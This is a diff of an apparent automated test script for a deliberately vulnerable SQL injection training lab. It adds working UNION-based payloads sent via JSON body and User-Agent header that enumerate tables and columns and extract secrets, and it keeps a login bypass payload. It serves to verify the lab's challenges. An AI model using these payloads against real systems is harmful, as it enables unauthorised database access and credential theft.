@@ -559,28 +559,49 @@ r = get('/modules/sqli/get.php?id=' + urllib.parse.quote('-1 UNION SELECT 1,secr
 check('GET 联合注入取通关凭证', '恭喜你完成本关挑战！' in r.text)
 r = post('/modules/sqli/post.php', {'username': "admin' or '1'='1", 'password': 'x'})
 check('POST 万能密码绕过', '当前身份：admin' in r.text)
-# JSON 注入：提交 JSON body，username 字段拼进 SQL
-r = requests.post(BASE + '/modules/sqli/json.php',
-                  data=json.dumps({'username': "admin'"}),
-                  headers={'Content-Type': 'application/json',
-                           'User-Agent': 'bafanglab-auto-test/1.0'},
-                  timeout=30, verify=False)
+# JSON 注入：提交 JSON body，username 字段拼进 SQL（本关按 UNION 路径设计）
+def _json_post(payload):
+    return requests.post(BASE + '/modules/sqli/json.php',
+                         data=json.dumps({'username': payload}),
+                         headers={'Content-Type': 'application/json',
+                                  'User-Agent': 'bafanglab-auto-test/1.0'},
+                         timeout=30, verify=False)
+
+r = _json_post("admin'")
 check('JSON 注入单引号触发 MySQL 报错', 'SQL syntax' in r.text or 'error' in r.text.lower())
-r = requests.post(BASE + '/modules/sqli/json.php',
-                  data=json.dumps({'username': "' or updatexml(1,concat(0x7e,(select secret from secrets limit 1)),1)-- -"}),
-                  headers={'Content-Type': 'application/json',
-                           'User-Agent': 'bafanglab-auto-test/1.0'},
-                  timeout=30, verify=False)
-check('JSON 注入 updatexml 读出通关凭证', '恭喜你完成本关挑战！' in r.text)
-# 请求头注入：User-Agent 拼进 SQL
-r = requests.get(BASE + '/modules/sqli/header.php',
-                 headers={'User-Agent': "admin'"},
-                 timeout=30, verify=False)
+r = _json_post("admin' union select 1,1,1 -- -")
+check('JSON 注入 UNION 测列数（3 列对齐）', '<td>1</td><td>1</td><td>1</td>' in r.text)
+r = _json_post("admin' union select 1,1,database() -- -")
+check('JSON 注入 UNION 读出库名', '<td>bafanglab</td>' in r.text)
+r = _json_post("admin' union select 1,1,(select group_concat(table_name) from information_schema.tables "
+               "where table_schema=database()) -- -")
+check('JSON 注入 UNION 读出表名', re.search(r'<td>[^<]*secrets[^<]*</td>', r.text) is not None)
+r = _json_post("admin' union select 1,1,(select group_concat(column_name) from information_schema.columns "
+               "where table_schema=database() and table_name='secrets') -- -")
+check('JSON 注入 UNION 读出列名', re.search(r'<td>[^<]*secret[^<]*</td>', r.text) is not None)
+r = _json_post("admin' union select 1,1,(select secret from secrets limit 0,1) -- -")
+check('JSON 注入 UNION 读出通关凭证', '恭喜你完成本关挑战！' in r.text)
+r = _json_post("admin' union select 1,1,(select secret from secrets) -- -")
+check('JSON 注入多行子查询报 Subquery returns more than 1 row',
+      'Subquery returns more than 1 row' in r.text)
+
+# 请求头注入：User-Agent 拼进 SQL（本关按 UNION 路径设计）
+def _ua_get(payload):
+    return requests.get(BASE + '/modules/sqli/header.php',
+                        headers={'User-Agent': payload},
+                        timeout=30, verify=False)
+
+r = _ua_get("'")
 check('请求头注入单引号触发 MySQL 报错', 'SQL syntax' in r.text or 'error' in r.text.lower())
-r = requests.get(BASE + '/modules/sqli/header.php',
-                 headers={'User-Agent': "' or updatexml(1,concat(0x7e,(select secret from secrets limit 1)),1)-- -"},
-                 timeout=30, verify=False)
-check('请求头注入 updatexml 读出通关凭证', '恭喜你完成本关挑战！' in r.text)
+r = _ua_get("' union select 1,1,1 -- -")
+check('请求头注入 UNION 测列数（3 列对齐）', '<td>1</td><td>1</td><td>1</td>' in r.text)
+r = _ua_get("' union select 1,1,database()  -- -")
+check('请求头注入 UNION 读出库名', '<td>bafanglab</td>' in r.text)
+r = _ua_get("' union select 1,1,(select group_concat(table_name) from information_schema.tables "
+            "where table_schema=database())  -- -")
+check('请求头注入 UNION 读出表名', re.search(r'<td>[^<]*secrets[^<]*</td>', r.text) is not None)
+r = _ua_get("' union select 1,1,(select secret from secrets limit 0,1)  -- -")
+check('请求头注入 UNION 读出通关凭证', '恭喜你完成本关挑战！' in r.text)
 r = get('/modules/sqli/error.php?id=' + urllib.parse.quote("1'"))
 check('报错注入回显 MySQL 错误', 'SQL syntax' in r.text or 'error' in r.text.lower())
 r = get('/modules/sqli/blind.php?name=' + urllib.parse.quote("admin' and 1=1-- -"))
